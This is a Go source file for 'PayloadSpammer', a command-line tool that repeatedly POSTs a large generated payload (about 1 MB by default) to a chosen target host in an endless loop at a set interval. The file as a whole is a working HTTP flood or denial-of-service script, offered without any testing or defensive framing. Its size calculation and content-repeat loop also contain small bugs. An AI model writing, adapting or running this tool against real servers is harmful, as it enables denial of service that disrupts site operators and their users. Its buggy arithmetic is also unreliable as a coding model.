package main

import (
	"bytes"
	"flag"
	"fmt"
	"net/http"
	"os"
	"time"
)

type payload struct {
	content     []byte
	destination string
}

var (
	version = "developement vesion 0.1"
)

func definePayload(size int, url string, content ...string) payload {

	// Define payload size
	definedSize := size * 1024 // Default size = 1024b * 1024b = 1mb
	definedContent := make([]byte, definedSize)

	// Generate payload based on given content
	if content[0] == "" {
		for i := range definedContent {
			definedContent[i] = 'A'
		}
	} else {
		j := 0

		for i := range definedContent {
			definedContent[i] = content[0][j]

			if j == len(content[0])-1 {
				j = 0
			}

			j++
		}
	}

	definedPayload := payload{content: definedContent, destination: url}
	return definedPayload

}

// Request handling
func sendRequest(url string, payload []byte) error {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/octet-stream")

	client := &http.Client{}

	resp, err := client.Do(req)

	if err != nil {
		return err

	}

	defer resp.Body.Close()

	fmt.Printf("Response status: %s\n", resp.Status)
	return nil
}

func main() {

	// Command line arguments
	host := flag.String("h", "", "Defines target host.")
	size := flag.Int("s", 1024, "Defines payload size in kilobytes.")
	content := flag.String("c", "", "Defines payload content string (optional).")
	help := flag.Bool("help", false, "Shows this help")
	timeInterwall := flag.Int("t", 1000, "Defines time interwall in ms.")
	timeInterwallMicro := flag.Int("tms", 1000000, "Defines time interwall in µs (NOT RECOMMENDED!).")
	showVersion := flag.Bool("version", false, "Shows the current version of the program.")
	flag.Parse()

	PrintLogo()

	// Help printout

	if *help {
		flag.Usage()
		return
	}

	if *showVersion {
		fmt.Printf("PayloadSpammer version %s\n", version)
	}

	// Sending payload if host is defined
	if *host != "" {

		payload := definePayload(*size, *host, *content)

		sizeInMb := *size * *size / 1048576

		fmt.Println("\x1b[31;1m", "New payload:", "\x1b[39m")
		fmt.Println("Content string: \x1b[33;1m", *content, "\x1b[39m *", sizeInMb, "mb | ", "Target: \x1b[33;1m", payload.destination, "\x1b[39m")

		sleepTime := time.Duration(*timeInterwall) * time.Millisecond

		if *timeInterwallMicro != 1000000 {
			sleepTime = time.Duration(*timeInterwallMicro) * time.Microsecond
		}

		fmt.Printf("\nTime interwall: \x1b[33;1m%f\x1b[39m s.\n", sleepTime.Seconds())

		fmt.Println("Sending packages... (terminate with Ctrl + C)")
		for {

			err := sendRequest(payload.destination, payload.content)

			if err != nil {
				fmt.Printf("Server request error: %v\n", err)
			}

			time.Sleep(sleepTime)
		}

	} else {
		fmt.Printf("Error. Host not defined.")
		os.Exit(0)
	}
}

func PrintLogo() {
	logo := []string{
		"   ▄███████▄    ▄████████ ▄██   ▄    ▄█        ▄██████▄     ▄████████ ████████▄  ",
		"  ███    ███   ███    ███ ███   ██▄ ███       ███    ███   ███    ███ ███   ▀███",
		"  ███    ███   ███    ███ ███▄▄▄███ ███       ███    ███   ███    ███ ███    ███",
		"▀█████████▀  ▀███████████ ▄██   ███ ███       ███    ███ ▀███████████ ███    ███",
		"  ███          ███    ███ ███   ███ ███       ███    ███   ███    ███ ███    ███",
		"  ███          ███    ███ ███   ███ ███▌    ▄ ███    ███   ███    ███ ███   ▄███",
		" ▄████▀        ███    █▀   ▀█████▀  █████▄▄██  ▀██████▀    ███    █▀  ████████▀ ",
		"                                                SPAMMER BY KALEVI",
	}

	for i, line := range logo {
		if i < 7 {
			fmt.Println("\x1b[31m", line, "\x1b[39m")
		} else {
			fmt.Println("\x1b[33m", line, "\x1b[39m")
		}
	}
}
